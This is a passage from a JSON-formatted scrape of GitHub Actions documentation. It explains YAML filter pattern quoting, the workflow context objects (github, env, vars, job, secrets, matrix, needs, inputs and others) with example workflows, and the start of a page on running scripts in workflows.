      {
        "type": "paragraph",
        "text": "The characters*,[, and!are special characters in YAML. If you start a pattern with*,[, or!, you must enclose the pattern in quotes. Also, if you use aflow sequencewith a pattern containing[and/or], the pattern must be enclosed in quotes."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Valid\npaths:\n  - '**/README.md'\n\n# Invalid - creates a parse error that\n# prevents your workflow from running.\npaths:\n  - **/README.md\n\n# Valid\nbranches: [ main, 'release/v[0-9].[0-9]' ]\n\n# Invalid - creates a parse error\nbranches: [ main, release/v[0-9].[0-9] ]"
      },
      {
        "type": "paragraph",
        "text": "For more information about branch, tag, and path filter syntax, seeon.<push>.<branches|tags>,on.<pull_request>.<branches|tags>, andon.<push|pull_request>.paths."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Patterns to match branches and tags"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Patterns to match file paths"
      },
      {
        "type": "paragraph",
        "text": "Path patterns must match the whole path, and start from the repository's root."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About contexts"
      },
      {
        "type": "paragraph",
        "text": "Contexts are a way to access information about workflow runs, variables, runner environments, jobs, and steps. Each context is an object that contains properties, which can be strings or other objects."
      },
      {
        "type": "paragraph",
        "text": "Contexts, objects, and properties will vary significantly under different workflow run conditions. For example, thematrixcontext is only populated for jobs in amatrix."
      },
      {
        "type": "paragraph",
        "text": "You can access contexts using the expression syntax. For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "${{ <context> }}"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "As part of an expression, you can access context information using one of two syntaxes."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Index syntax:github['sha']",
          "Property dereference syntax:github.sha"
        ]
      },
      {
        "type": "paragraph",
        "text": "In order to use property dereference syntax, the property name must start with a letter or_and contain only alphanumeric characters,-, or_."
      },
      {
        "type": "paragraph",
        "text": "If you attempt to dereference a nonexistent property, it will evaluate to an empty string."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Determining when to use contexts"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions includes a collection of variables calledcontextsand a similar collection of variables calleddefault variables. These variables are intended for use at different points in the workflow:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Default environment variables:These environment variables exist only on the runner that is executing your job. For more information, seeStore information in variables.",
          "Contexts:You can use most contexts at any point in your workflow, including whendefault variableswould be unavailable. For example, you can use contexts with expressions to perform initial processing before the job is routed to a runner for execution; this allows you to use a context with the conditionalifkeyword to determine whether a step should run. Once the job is running, you can also retrieve context variables from the runner that is executing the job, such asrunner.os. For details of where you can use various contexts within a workflow, seeContext availability."
        ]
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how these different types of variables can be used together in a job:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: CI\non: push\njobs:\n  prod-check:\n    if: ${{ github.ref == 'refs/heads/main' }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploying to production server on branch $GITHUB_REF\""
      },
      {
        "type": "paragraph",
        "text": "In this example, theifstatement checks thegithub.refcontext to determine the current branch name; if the name isrefs/heads/main, then the subsequent steps are executed. Theifcheck is processed by GitHub Actions, and the job is only sent to the runner if the result istrue. Once the job is sent to the runner, the step is executed and refers to the$GITHUB_REFvariable from the runner."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Context availability"
      },
      {
        "type": "paragraph",
        "text": "Different contexts are available throughout a workflow run. For example, thesecretscontext may only be used at certain places within a job."
      },
      {
        "type": "paragraph",
        "text": "In addition, some functions may only be used in certain places. For example, thehashFilesfunction is not available everywhere."
      },
      {
        "type": "paragraph",
        "text": "The following table lists the restrictions on where each context and special function can be used within a workflow. The listed contexts are only available for the given workflow key, and may not be used anywhere else. Unless listed below, a function can be used anywhere."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: printing context information to the log"
      },
      {
        "type": "paragraph",
        "text": "You can print the contents of contexts to the log for debugging. ThetoJSONfunctionis required to pretty-print JSON objects to the log."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When using the wholegithubcontext, be mindful that it includes sensitive information such asgithub.token. GitHub masks secrets when they are printed to the console, but you should be cautious when exporting or printing the context."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Context testing\non: push\n\njobs:\n  dump_contexts_to_log:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - name: Dump job context\n        env:\n          JOB_CONTEXT: ${{ toJson(job) }}\n        run: echo \"$JOB_CONTEXT\"\n      - name: Dump steps context\n        env:\n          STEPS_CONTEXT: ${{ toJson(steps) }}\n        run: echo \"$STEPS_CONTEXT\"\n      - name: Dump runner context\n        env:\n          RUNNER_CONTEXT: ${{ toJson(runner) }}\n        run: echo \"$RUNNER_CONTEXT\"\n      - name: Dump strategy context\n        env:\n          STRATEGY_CONTEXT: ${{ toJson(strategy) }}\n        run: echo \"$STRATEGY_CONTEXT\"\n      - name: Dump matrix context\n        env:\n          MATRIX_CONTEXT: ${{ toJson(matrix) }}\n        run: echo \"$MATRIX_CONTEXT\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "githubcontext"
      },
      {
        "type": "paragraph",
        "text": "Thegithubcontext contains information about the workflow run and the event that triggered the run. You can also read most of thegithubcontext data in environment variables. For more information about environment variables, seeStore information in variables."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When using the wholegithubcontext, be mindful that it includes sensitive information such asgithub.token. GitHub masks secrets when they are printed to the console, but you should be cautious when exporting or printing the context.\n\nWhen creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thegithubcontext"
      },
      {
        "type": "paragraph",
        "text": "The following example context is from a workflow run triggered by thepushevent. Theeventobject in this example has been truncated because it is identical to the contents of thepushwebhook payload."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This context is an example only. The contents of a context depends on the workflow that you are running. Contexts, objects, and properties will vary significantly under different workflow run conditions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"token\": \"***\",\n  \"job\": \"dump_contexts_to_log\",\n  \"ref\": \"refs/heads/my_branch\",\n  \"sha\": \"c27d339ee6075c1f744c5d4b200f7901aad2c369\",\n  \"repository\": \"octocat/hello-world\",\n  \"repository_owner\": \"octocat\",\n  \"repositoryUrl\": \"git://github.com/octocat/hello-world.git\",\n  \"run_id\": \"1536140711\",\n  \"run_number\": \"314\",\n  \"retention_days\": \"90\",\n  \"run_attempt\": \"1\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"Context testing\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"push\",\n  \"event\": {\n    ...\n  },\n  \"server_url\": \"https://github.com\",\n  \"api_url\": \"https://api.github.com\",\n  \"graphql_url\": \"https://api.github.com/graphql\",\n  \"ref_name\": \"my_branch\",\n  \"ref_protected\": false,\n  \"ref_type\": \"branch\",\n  \"secret_source\": \"Actions\",\n  \"workspace\": \"/home/runner/work/hello-world/hello-world\",\n  \"action\": \"github_step\",\n  \"event_path\": \"/home/runner/work/_temp/_github_workflow/event.json\",\n  \"action_repository\": \"\",\n  \"action_ref\": \"\",\n  \"path\": \"/home/runner/work/_temp/_runner_file_commands/add_path_b037e7b5-1c88-48e2-bf78-eaaab5e02602\",\n  \"env\": \"/home/runner/work/_temp/_runner_file_commands/set_env_b037e7b5-1c88-48e2-bf78-eaaab5e02602\"\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thegithubcontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow uses thegithub.event_namecontext to run a job only if the workflow run was triggered by thepull_requestevent."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Run CI\non: [push, pull_request]\n\njobs:\n  normal_ci:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Run normal CI\n        run: echo \"Running normal CI\"\n\n  pull_request_ci:\n    runs-on: ubuntu-latest\n    if: ${{ github.event_name == 'pull_request' }}\n    steps:\n      - name: Run PR CI\n        run: echo \"Running PR only CI\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "envcontext"
      },
      {
        "type": "paragraph",
        "text": "Theenvcontext contains variables that have been set in a workflow, job, or step. It does not contain variables inherited by the runner process. For more information about setting variables in your workflow, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "You can retrieve the values of variables stored inenvcontext and use these values in your workflow file. You can use theenvcontext in any key in a workflow step except for theidanduseskeys. For more information on the step syntax, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If you want to use the value of a variable inside a runner, use the runner operating system's normal method for reading environment variables."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of theenvcontext"
      },
      {
        "type": "paragraph",
        "text": "The contents of theenvcontext is a mapping of variable names to their values. The context's contents can change depending on where it is used in the workflow run. In this example, theenvcontext contains two variables."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"first_name\": \"Mona\",\n  \"super_duper_var\": \"totally_awesome\"\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of theenvcontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow shows variables being set in theenvcontext at the workflow, job, and step levels. The${{ env.VARIABLE-NAME }}syntax is then used to retrieve variable values within individual steps in the workflow."
      },
      {
        "type": "paragraph",
        "text": "When more than one environment variable is defined with the same name, GitHub uses the most specific variable. For example, an environment variable defined in a step will override job and workflow environment variables with the same name, while the step executes. An environment variable defined for a job will override a workflow variable with the same name, while the job executes."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Hi Mascot\non: push\nenv:\n  mascot: Mona\n  super_duper_var: totally_awesome\n\njobs:\n  windows_job:\n    runs-on: windows-latest\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Mona\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Octocat\n        env:\n          mascot: Octocat\n  linux_job:\n    runs-on: ubuntu-latest\n    env:\n      mascot: Tux\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Tux"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "varscontext"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Configuration variables for GitHub Actions are in public preview and subject to change."
      },
      {
        "type": "paragraph",
        "text": "Thevarscontext contains custom configuration variables set at the organization, repository, and environment levels. For more information about defining configuration variables for use in multiple workflows, seeStore information in variables."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thevarscontext"
      },
      {
        "type": "paragraph",
        "text": "The contents of thevarscontext is a mapping of configuration variable names to their values."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"mascot\": \"Mona\"\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thevarscontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow shows how configuration variables set at the repository, environment, or organization levels are automatically available using thevarscontext."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Configuration variables at the environment level are automatically available after their environment is declared by the runner."
      },
      {
        "type": "paragraph",
        "text": "If a configuration variable has not been set, the return value of a context referencing the variable will be an empty string."
      },
      {
        "type": "paragraph",
        "text": "The following example shows using configuration variables with thevarscontext across a workflow. Each of the following configuration variables have been defined at the repository, organization, or environment levels."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_dispatch:\nenv:\n  # Setting an environment variable with the value of a configuration variable\n  env_var: ${{ vars.ENV_CONTEXT_VAR }}\n\njobs:\n  display-variables:\n    name: ${{ vars.JOB_NAME }}\n    # You can use configuration variables with the `vars` context for dynamic jobs\n    if: ${{ vars.USE_VARIABLES == 'true' }}\n    runs-on: ${{ vars.RUNNER }}\n    environment: ${{ vars.ENVIRONMENT_STAGE }}\n    steps:\n    - name: Use variables\n      run: |\n        echo \"repository variable : $REPOSITORY_VAR\"\n        echo \"organization variable : $ORGANIZATION_VAR\"\n        echo \"overridden variable : $OVERRIDE_VAR\"\n        echo \"variable from shell environment : $env_var\"\n      env:\n        REPOSITORY_VAR: ${{ vars.REPOSITORY_VAR }}\n        ORGANIZATION_VAR: ${{ vars.ORGANIZATION_VAR }}\n        OVERRIDE_VAR: ${{ vars.OVERRIDE_VAR }}\n        \n    - name: ${{ vars.HELLO_WORLD_STEP }}\n      if: ${{ vars.HELLO_WORLD_ENABLED == 'true' }}\n      uses: actions/hello-world-javascript-action@main\n      with:\n        who-to-greet: ${{ vars.GREET_NAME }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobcontext"
      },
      {
        "type": "paragraph",
        "text": "Thejobcontext contains information about the currently running job."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thejobcontext"
      },
      {
        "type": "paragraph",
        "text": "This examplejobcontext uses a PostgreSQL service container with mapped ports. If there are no containers or service containers used in a job, thejobcontext only contains thestatusproperty."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"status\": \"success\",\n  \"container\": {\n    \"network\": \"github_network_53269bd575974817b43f4733536b200c\"\n  },\n  \"services\": {\n    \"postgres\": {\n      \"id\": \"60972d9aa486605e66b0dad4abb638dc3d9116f566579e418166eedb8abb9105\",\n      \"ports\": {\n        \"5432\": \"49153\"\n      },\n      \"network\": \"github_network_53269bd575974817b43f4733536b200c\"\n    }\n  }\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thejobcontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow configures a PostgreSQL service container, and automatically maps port 5432 in the service container to a randomly chosen available port on the host. Thejobcontext is used to access the number of the port that was assigned on the host."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: PostgreSQL Service Example\non: push\njobs:\n  postgres-job:\n    runs-on: ubuntu-latest\n    services:\n      postgres:\n        image: postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n        ports:\n          # Maps TCP port 5432 in the service container to a randomly chosen available port on the host.\n          - 5432\n\n    steps:\n      - run: pg_isready -h localhost -p ${{ job.services.postgres.ports[5432] }}\n      - run: echo \"Run tests against Postgres\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobscontext"
      },
      {
        "type": "paragraph",
        "text": "Thejobscontext is only available in reusable workflows, and can only be used to set outputs for a reusable workflow. For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thejobscontext"
      },
      {
        "type": "paragraph",
        "text": "This examplejobscontext contains the result and outputs of a job from a reusable workflow run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"example_job\": {\n    \"result\": \"success\",\n    \"outputs\": {\n      \"output1\": \"hello\",\n      \"output2\": \"world\"\n    }\n  }\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thejobscontext"
      },
      {
        "type": "paragraph",
        "text": "This example reusable workflow uses thejobscontext to set outputs for the reusable workflow. Note how the outputs flow up from the steps, to the job, then to theworkflow_calltrigger. For more information, seeReusing workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Reusable workflow\n\non:\n  workflow_call:\n    # Map the workflow outputs to job outputs\n    outputs:\n      firstword:\n        description: \"The first output string\"\n        value: ${{ jobs.example_job.outputs.output1 }}\n      secondword:\n        description: \"The second output string\"\n        value: ${{ jobs.example_job.outputs.output2 }}\n\njobs:\n  example_job:\n    name: Generate output\n    runs-on: ubuntu-latest\n    # Map the job outputs to step outputs\n    outputs:\n      output1: ${{ steps.step1.outputs.firstword }}\n      output2: ${{ steps.step2.outputs.secondword }}\n    steps:\n      - id: step1\n        run: echo \"firstword=hello\" >> $GITHUB_OUTPUT\n      - id: step2\n        run: echo \"secondword=world\" >> $GITHUB_OUTPUT"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "stepscontext"
      },
      {
        "type": "paragraph",
        "text": "Thestepscontext contains information about the steps in the current job that have anidspecified and have already run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thestepscontext"
      },
      {
        "type": "paragraph",
        "text": "This examplestepscontext shows two previous steps that had anidspecified. The first step had theidnamedcheckout, the secondgenerate_number. Thegenerate_numberstep had an output namedrandom_number."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"checkout\": {\n    \"outputs\": {},\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  },\n  \"generate_number\": {\n    \"outputs\": {\n      \"random_number\": \"1\"\n    },\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  }\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thestepscontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow generates a random number as an output in one step, and a later step uses thestepscontext to read the value of that output."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Generate random failure\non: push\njobs:\n  randomly-failing-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Generate 0 or 1\n        id: generate_number\n        run: echo \"random_number=$(($RANDOM % 2))\" >> $GITHUB_OUTPUT\n      - name: Pass or fail\n        run: |\n          if [[ ${{ steps.generate_number.outputs.random_number }} == 0 ]]; then exit 0; else exit 1; fi"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "runnercontext"
      },
      {
        "type": "paragraph",
        "text": "Therunnercontext contains information about the runner that is executing the current job."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of therunnercontext"
      },
      {
        "type": "paragraph",
        "text": "The following example context is from a Linux GitHub-hosted runner."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"os\": \"Linux\",\n  \"arch\": \"X64\",\n  \"name\": \"GitHub Actions 2\",\n  \"tool_cache\": \"/opt/hostedtoolcache\",\n  \"temp\": \"/home/runner/work/_temp\"\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of therunnercontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow uses therunnercontext to set the path to the temporary directory to write logs, and if the workflow fails, it uploads those logs as artifact."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build with logs\n        run: |\n          mkdir ${{ runner.temp }}/build_logs\n          echo \"Logs from building\" > ${{ runner.temp }}/build_logs/build.logs\n          exit 1\n      - name: Upload logs on fail\n        if: ${{ failure() }}\n        uses: actions/upload-artifact@v4\n        with:\n          name: Build failure logs\n          path: ${{ runner.temp }}/build_logs"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "secretscontext"
      },
      {
        "type": "paragraph",
        "text": "Thesecretscontext contains the names and values of secrets that are available to a workflow run. Thesecretscontext is not available for composite actions due to security reasons. If you want to pass a secret to a composite action, you need to do it explicitly as an input. For more information about secrets, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "GITHUB_TOKENis a secret that is automatically created for every workflow run, and is always included in thesecretscontext. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "If a secret is used in a workflow job, GitHub automatically redacts secrets printed to the log. You should avoid printing secrets to the log intentionally."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thesecretscontext"
      },
      {
        "type": "paragraph",
        "text": "The following example contents of thesecretscontext shows the automaticGITHUB_TOKEN, as well as two other secrets available to the workflow run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"github_token\": \"***\",\n  \"NPM_TOKEN\": \"***\",\n  \"SUPERSECRET\": \"***\"\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thesecretscontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow uses theGitHub CLI, which requires theGITHUB_TOKENas the value for theGH_TOKENinput parameter:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Open new issue\non: workflow_dispatch\n\njobs:\n  open-issue:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      issues: write\n    steps:\n      - run: |\n          gh issue --repo ${{ github.repository }} \\\n            create --title \"Issue title\" --body \"Issue body\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "strategycontext"
      },
      {
        "type": "paragraph",
        "text": "For workflows with a matrix, thestrategycontext contains information about the matrix execution strategy for the current job."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thestrategycontext"
      },
      {
        "type": "paragraph",
        "text": "The following example contents of thestrategycontext is from a matrix with four jobs, and is taken from the final job. Note the difference between the zero-basedjob-indexnumber, andjob-totalwhich is not zero-based."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"fail-fast\": true,\n  \"job-index\": 3,\n  \"job-total\": 4,\n  \"max-parallel\": 4\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thestrategycontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow uses thestrategy.job-indexproperty to set a unique name for a log file for each job in a matrix."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Test strategy\non: push\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        test-group: [1, 2]\n        node: [14, 16]\n    steps:\n      - run: echo \"Mock test logs\" > test-job-${{ strategy.job-index }}.txt\n      - name: Upload logs\n        uses: actions/upload-artifact@v4\n        with:\n          name: Build log for job ${{ strategy.job-index }}\n          path: test-job-${{ strategy.job-index }}.txt"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "matrixcontext"
      },
      {
        "type": "paragraph",
        "text": "For workflows with a matrix, thematrixcontext contains the matrix properties defined in the workflow file that apply to the current job. For example, if you configure a matrix with theosandnodekeys, thematrixcontext object includes theosandnodeproperties with the values that are being used for the current job."
      },
      {
        "type": "paragraph",
        "text": "There are no standard properties in thematrixcontext, only those which are defined in the workflow file."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of thematrixcontext"
      },
      {
        "type": "paragraph",
        "text": "The following example contents of thematrixcontext is from a job in a matrix that has theosandnodematrix properties defined in the workflow. The job is executing the matrix combination of anubuntu-latestOS and Node.js version16."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"os\": \"ubuntu-latest\",\n  \"node\": 16\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of thematrixcontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow creates a matrix withosandnodekeys. It uses thematrix.osproperty to set the runner type for each job, and uses thematrix.nodeproperty to set the Node.js version for each job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Test matrix\non: push\n\njobs:\n  build:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n        node: [14, 16]\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n      - name: Output node version\n        run: node --version"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "needscontext"
      },
      {
        "type": "paragraph",
        "text": "Theneedscontext contains outputs from all jobs that are defined as a direct dependency of the current job. Note that this doesn't include implicitly dependent jobs (for example, dependent jobs of a dependent job). For more information on defining job dependencies, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of theneedscontext"
      },
      {
        "type": "paragraph",
        "text": "The following example contents of theneedscontext shows information for two jobs that the current job depends on."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"build\": {\n    \"result\": \"success\",\n    \"outputs\": {\n      \"build_id\": \"123456\"\n    }\n  },\n  \"deploy\": {\n    \"result\": \"failure\",\n    \"outputs\": {}\n  }\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of theneedscontext"
      },
      {
        "type": "paragraph",
        "text": "This example workflow has three jobs: abuildjob that does a build, adeployjob that requires thebuildjob, and adebugjob that requires both thebuildanddeployjobs and runs only if there is a failure in the workflow. Thedeployjob also uses theneedscontext to access an output from thebuildjob."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build and deploy\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      build_id: ${{ steps.build_step.outputs.build_id }}\n    steps:\n      - name: Build\n        id: build_step\n        run: echo \"build_id=$RANDOM\" >> $GITHUB_OUTPUT\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploying build ${{ needs.build.outputs.build_id }}\"\n  debug:\n    needs: [build, deploy]\n    runs-on: ubuntu-latest\n    if: ${{ failure() }}\n    steps:\n      - run: echo \"Failed to build and deploy\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "inputscontext"
      },
      {
        "type": "paragraph",
        "text": "Theinputscontext contains input properties passed to an action, to a reusable workflow, or to a manually triggered workflow. For reusable workflows, the input names and types are defined in theworkflow_callevent configurationof a reusable workflow, and the input values are passed fromjobs.<job_id>.within an external workflow that calls the reusable workflow. For manually triggered workflows, the inputs are defined in theworkflow_dispatchevent configurationof a workflow."
      },
      {
        "type": "paragraph",
        "text": "The properties in theinputscontext are defined in the workflow file. They are only available in areusable workflowor in a workflow triggered by theworkflow_dispatchevent"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example contents of theinputscontext"
      },
      {
        "type": "paragraph",
        "text": "The following example contents of theinputscontext is from a workflow that has defined thebuild_id,deploy_target, andperform_deployinputs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"build_id\": 123456768,\n  \"deploy_target\": \"deployment_sys_1a\",\n  \"perform_deploy\": true\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of theinputscontext in a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "This example reusable workflow uses theinputscontext to get the values of thebuild_id,deploy_target, andperform_deployinputs that were passed to the reusable workflow from the caller workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Reusable deploy workflow\non:\n  workflow_call:\n    inputs:\n      build_id:\n        required: true\n        type: number\n      deploy_target:\n        required: true\n        type: string\n      perform_deploy:\n        required: true\n        type: boolean\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.perform_deploy }}\n    steps:\n      - name: Deploy build to target\n        run: echo \"Deploying build:${{ inputs.build_id }} to target:${{ inputs.deploy_target }}\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example usage of theinputscontext in a manually triggered workflow"
      },
      {
        "type": "paragraph",
        "text": "This example workflow triggered by aworkflow_dispatchevent uses theinputscontext to get the values of thebuild_id,deploy_target, andperform_deployinputs that were passed to the workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_dispatch:\n    inputs:\n      build_id:\n        required: true\n        type: string\n      deploy_target:\n        required: true\n        type: string\n      perform_deploy:\n        required: true\n        type: boolean\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.perform_deploy }}\n    steps:\n      - name: Deploy build to target\n        run: echo \"Deploying build:${{ inputs.build_id }} to target:${{ inputs.deploy_target }}\""
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/adding-scripts-to-your-workflow",
    "content": [
      {
        "type": "paragraph",
        "text": "You can use a GitHub Actions workflow to run scripts and shell commands, which are then executed on the assigned runner. This example demonstrates how to use therunkeyword to execute the commandnpm install -g batson the runner."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm install -g bats"
      },
      {
        "type": "paragraph",
        "text": "To use a workflow to run a script stored in your repository you must first check out the repository to the runner. Having done this, you can use therunkeyword to run the script on the runner. The following example runs two scripts, each in a separate job step. The location of the scripts on the runner is specified by setting a default working directory for run commands. For more information, seeSetting a default shell and working directory."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example-job:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./scripts\n    steps:\n      - name: Check out the repository to the runner\n        uses: actions/checkout@v4  \n      - name: Run a script\n        run: ./my-script.sh\n      - name: Run another script\n        run: ./my-other-script.sh"
      },
      {
        "type": "paragraph",
        "text": "Any scripts that you want a workflow job to run must be executable. You can do this either within the workflow by passing the script as an argument to the interpreter that will run the script - for example,run: bash script.sh- or by making the file itself executable. You can give the file the execute permission by using the commandgit update-index --chmod=+x PATH/TO/YOUR/script.shlocally, then committing and pushing the file to the repository. Alternatively, for workflows that are run on Linux and Mac runners, you can add a command to give the file the execute permission in the workflow job, prior to running the script:"
      },
      {
        "type": "code",
        "language": "yaml",
